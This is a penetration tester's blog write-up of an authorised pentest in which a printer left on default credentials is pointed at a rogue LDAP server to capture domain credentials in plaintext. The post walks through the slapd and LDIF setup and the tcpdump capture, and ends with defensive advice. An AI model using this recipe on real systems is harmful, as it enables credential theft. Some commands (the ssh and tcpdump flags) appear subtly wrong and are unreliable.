---
layout: "single"
title: "Snatching Domain Creds from Unexpected Places."
date: "2019-04-29 15:24"
author_profile: true
toc: true
---

{% include figure image_path="/images/posts/password-snatch.jpg" type=center %}

# It was just another boring pentest

I recently had an interesting network pentest and thought it'd be worth a share to my fellow red teamers out there. I'll set the stage. A colleague and I were both working the same penetration test for a PCI client, both a merchant & service provider. I had just wrapped up the external pentest and my colleague had an extra week worth of time on the internal, so I jumped in to help. 

I already knew going in that it was going to be rough because the external turned up almost _no_ findings at all, and my friend had already been banging his head against the internal network remotely for a week.

When I first arrived into the network and started on my own recon process, I quickly came to a lot of the same conclusions that my partner had. This network would be tough. Our job was to emphasize on stealth because the blue team would be actively hunting us and trying to test out their incident response procedures as we worked. I can say they did a good job of doing that without being overly restrictive. It made for a truly fun cat-and-mouse game. 

For roughly 3 days, we continued doing low-and-slow nmap scans and digging around in the network for interesting services. We both saw evidence of Nessus, splunk, and Symmantec Enterprise End-point protection that somewhat indicated these guys were serious about their internal network security. 

This point was proven when I discovered an Apache Tomcat server in their dev environment that had just recently been stood up. I immediately tested for default creds aaaaand -- bam -- manager console access. "Awesome!" thought I. We finally had a chance to get a shell on a local network machine, which was Windows 10. 

If I was lucky, the Tomcat server would be running as local admin and I could just mimikatz myself to victory. Or so I thought ...

# Turns out their incident response process was pretty kick-ass

I went the usual route, uploading a malicious WAR with a simple `java/reverse_tcp` shell and used the fancy new `--encrypt` option for good measure. I meticulously prepped my attack to make sure it would have the best chance of success. After I finally uploaded it and executed the .jsp page with my shell ... nothing. I got an internal 505 error and no session came back. My first instinct was that they had some egress filtering in place, perhaps. 

Then we got an email from the client describing exactly the actions I performed on those exact servers and asked if it was us that did it. I realized their endpoint protection must have picked off the payload and tattled on us. By the time we emailed them back, they shut down and changed all the passwords on all of the Tomcat servers in the environment. To say the least, we were both impressed by the response time. It was going to be a long pentest.

# When suddenly ... there was a printer

While looking through the various subnets, I kept noting the presence of a lot of managed printers that were hanging around. Normally I don't give them much thought, but the both of us were coming up on the final hours of testing and hadn't come up with anything particularly substantial. The first printer I popped was an IPP-managed printer that I was able to connect to via SOCKS proxy through the appliance. This was a simple case of port-forwarding the IPP port (631/tcp) like so... `ssh -l 631:target-ip:631 my-user@attack-box`. 

I came to find out that this printer actually was sitting in the CEO's office because "John Doe's Office" was in the hostname. A quick LinkedIn search revealed that only one John Doe worked at the company, making him easy to pick out. The realization that if I could manage to steal some of the jobs off the printer and find some sweet, sweet PCI data or credentials dawned on me, but it was a longshot. I could troll their boss but ... well... I'm supposed to be professional. Oh well. 

I documented the default admin credentials and moved on.

# Things looked grim

We spent the remainder of the day beating our heads against the wall, trying every trick in the book. SMB relay was no good, they enforced SMB signing domain-wide. Good for them, bad for us. There were a few pieces of software that _looked_ vulnerable to RCE for a second, but proved unexploitable because they had already hardened the hosts against the default credentials or implemented work arounds. Once again, blue-team scores. 

Finally, I came across one final printer, this time a Kyocera floor model laser printer that stuck out to me. It had SNMP, NetBIOS, FTP, SMB, Telnet, and HTTPS web services all running on it simultaneously. I connected to the web server and saw a login prompt. On instinct, I looked up the default credentials for the model, which relinquished full control of the printer to me. I also took the time to check out the telnet service and quickly realized it was a command-line configuration console with _no_ password at all. 

> "Should we maybe put a password on the telnet port for this printer?"  
> "Nah... nobody uses telnet. What could go wrong?"  
**--Kyocera Devs**
{: style="text-align: right"}

I wasn't sure what I was looking for, but with only an hour left in the pentest, I was digging with my fingernails for something useful. At least I could say I found default credentials in a PCI environment as I waved my pathetic little victory flag.

# Light at the end of the tunnel

Suddenly, I realized there were configurations for SMTP and LDAP services on the printer when I began digging around in the advanced configuration settings. I noted that there were domain user credentials on this thing. 

_-gasp-_ "Oh my God, we could still pull this off," I thought. 

The credentials themselves were masked, which was frustrating at first. Then I suddenly remembered, "Duh, I'm the admin. I can just tell it to talk to any server I want!" 

I learned from my good friend @JamCut that this classic attack is called a ["Passback Attack"](http://h.foofus.net/?p=468) and was first published officially by Deral (PercX) Heiland and Michael (omi) Belton back at DefCon 19. For some servers, it's as easy as opening up netcat and telling the printer to connect back to your netcat listener to deliver credentials. Sadly, in my case, LDAP does not like to just give up credentials like a humble hacker might hope. Without that LDAP handshake, it won't so much as acknowledge your existence. 

For me to get that printer to give up its credentials, I would need to stand up my own rogue LDAP server. Then we could get somewhere.

# Step 1: Build a rogue LDAP server

The first hurdle for this attack was simply swapping out the IP address of the Domain controller for my own host. For the next part, since there currently aren't any metasploit modules that do this for me, I would need to build my own LDAP server from scratch. :(

The LDAP setup was a bit tricky, but thankfully I happened to have built a few in my spare time. I also found a very helpful blog post from [Danny Rappleyea](https://www.digitalreplica.org/about/) titled [OpenLDAP for LDAP Plaintext Password Capture](https://www.digitalreplica.org/2015/10/openldap-for-ldap-plain-text-password-capture/) that walked me through the process. 

The most important component of the attack was configuring my LDAP server to require "PLAIN" authentication only, via unencrypted LDAP. To do this requires a bit of prior LDAP experience, and some familiarity with LDAP's unique  _.ldif_ configuration files. 

```
# Install slapd on Kali Linux
apt-get update
apt-get -y install slapd

# Configure the server
dpkg-reconfigure -p low slapd
```

Select the following settings: 
* Omit OpenLDAP server Configuration? **NO**
* DNS domain name: **victim.com** 
* Organization Name: **victim.com**
* Administrator password: **Dealer's Choice**
* Database backend to use: **HDB**
* Do you want the database to be removed when slapd is purched? **NO**
* Move old database? **YES**
* Allow LDAPv2 Protocol? **YES** (This enables PLAIN-auth support :D)

Next, start your slapd server

```
systemctl start slapd
```

The next thing you'll need to do is copy the following text into an .ldif file

```
cat >olcPlainAuthOnly.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```

Hit ESC to end the cat stream

Now, before you apply the LDIF changes, check the existing authentication mechanisms, and ensure the changes are applied.

```
# Check Existing Settings
ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms

##OUTPUT##
dn:
supportedSASLMechanisms: DIGEST-MD5
supportedSASLMechanisms: CRAM-MD5
supportedSASLMechanisms: NTLM

# Apply LDIF Changes
ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcPlainAuthOnly.ldif

# If you don't get any errors, restart slapd and check your configuration

systemctl restart slapd
ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms

##OUTPUT##
dn:
supportedSASLMechanisms: PLAIN
supportedSASLMechanisms: LOGIN
```

When you see PLAIN and LOGIN as the only supported SASL authentication methods, you're good to go. The last step is to modify the printer settings to make sure it connects to your IP on the LDAP port (389 by default), and if the printer supports secure SSL/TLS or STARTTLS, make sure to turn that stuff off. The process for each printer will vary, but if you've gotten this far, I'm confident you'll find it. 

No problem when you're the printer's local admin ;) 

# Step 2: Profit

After I finally opened up my LDAP service, I fired up tcpdump via `tcpdump -SXnn -p 389 -i eth0` so that it would listen to all the LDAP traffic and print out the ASCII packet trace. After that, I hit "Test Connection" on the printer.

![Obligatory, Heavily Censored Screenshot](/images/posts/ldap-passback.png)

Lo' and behold, those lovely domain credentials came back clear as day in plain text. Thanks to our newly acquired domain access, we had the ability to enumerate usernames, domain admins, and domain computers via rid cycling, courtesy of @Gilks [enumerid](https://github.com/gilks/enumerid) tool. 

And the mouse escaped to live another day.

# Reflection

The results of the test turned out quite nicely despite struggling for the first 90% of it. The main lesson I took from this particular test is that you shouldn't overlook embedded hardware, especially managed printers. As it turns out, this particular printer needed those LDAP credentials to pull out user emails for doing copy-to-email functions. It's a convenient feature, but a two-edged sword. 

Leaving default credentials on your embedded hardware will make any hacker's day. 

For that reason, I would also offer the following advice to the blue teamers out there. Tons of printers come with pre-configured web services. Most of the time, they get installed by the third party printer service technicians, and you don't think twice about them. Beyond setting up those initial LDAP settings and such, you probably wouldn't look back. Except, maybe you configured those settings locally at the printer console and not the web console? Remember to double-check your printers and other embedded hardware for hidden web services and remote command-line consoles.
